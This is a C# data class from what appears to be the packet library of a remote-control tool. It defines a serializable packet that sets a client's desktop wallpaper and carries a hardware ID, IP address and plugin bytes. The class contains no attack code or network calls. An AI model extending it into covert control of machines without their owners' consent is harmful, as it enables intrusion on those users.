using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class WallPaperPacket : IPacket
    {
        public WallPaperPacket(byte[] wallpaper, string ext) : base() 
        {
            this.PacketType = PacketType.MISC_SET_WALLPAPER;

            this.wallpaper = wallpaper;
            this.ext = ext;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public byte[] wallpaper { get; set; }
        public string ext { get; set; }
    }
}
